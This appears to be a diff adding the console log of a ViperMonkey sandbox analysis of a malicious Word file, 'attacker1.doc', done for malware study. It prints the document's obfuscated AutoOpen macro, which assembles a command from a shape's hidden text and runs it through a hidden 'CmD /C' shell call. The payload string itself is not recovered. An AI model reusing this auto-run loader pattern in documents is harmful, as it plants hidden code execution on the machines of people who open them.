@@ -1,0 +1,118 @@
+[*] Running 'docker ps' to see if script has required privileges to run...
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+[*] Pulling and starting container...
+latest: Pulling from haroldogden/vipermonkey
+Digest: sha256:0ebbe27f2d0da95f4668de5386df7eee8fb6bb0ced6f2fb92492e677b41eca79
+Status: Image is up to date for haroldogden/vipermonkey:latest
+docker.io/haroldogden/vipermonkey:latest
+[*] Attempting to copy file attacker1.doc into container ID 388c1ba91291b8c65507866784387f252c6020e923b013fe40316054559337bf
+[*] Starting openoffice listener for file content conversions...
+[*] Checking for ViperMonkey and dependency updates...
+[*] Disabling network connection for container ID 388c1ba91291b8c65507866784387f252c6020e923b013fe40316054559337bf
+ _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 1.0.2 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: /root/attacker1.doc
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file:  - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+
+Sub AutoOpen()
+On Error Resume Next
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+rjvFRbqzLtkzn = "" + ""
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+SKKdjMpgJRQRK = "" + "" + Trim("")
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+hdNxDVBxCTqQTpB = LTrim("")
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+RJzJQGRzrc = ""
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+CWflqnrJbKVBj = RTrim("") + ""
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+Set pNHbvwXpnbZvS = Shapes(Trim("h9mkae7"))
+' STRIPPED LINE
+' STRIPPED LINE
+VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+' STRIPPED LINE
+End Sub
+
+
+
+
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+
+Recorded Actions:
++----------------------+-----------------+---------------------------------+
+| Action               | Parameters      | Description                     |
++----------------------+-----------------+---------------------------------+
+| Start Regular        |                 | All wildcard matches will match |
+| Emulation            |                 |                                 |
+| Found Entry Point    | autoopen        |                                 |
+| Object.Method Call   | ['CmD /C 0', 0] | VBA.Shell                       |
+| Execute Command      | CmD /C 0        | Shell function                  |
++----------------------+-----------------+---------------------------------+
+
+Intermediate IOCs:
+
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/drawingml/2006/main
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/officeDocument/2006/bibliography
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/officeDocument/2006/customXml
++---------------------------------------------------------+
+
+VBA Builtins Called: ['CInt', 'LTrim', 'RTrim', 'Replace', 'Shapes', 'Trim', 'VBA.Shell']
+
+Finished analyzing /root/attacker1.doc .
+
+[*] Dropped files are in attacker1.doc_artifacts.zip
+[*] Done - Killing docker container 388c1ba91291b8c65507866784387f252c6020e923b013fe40316054559337bf
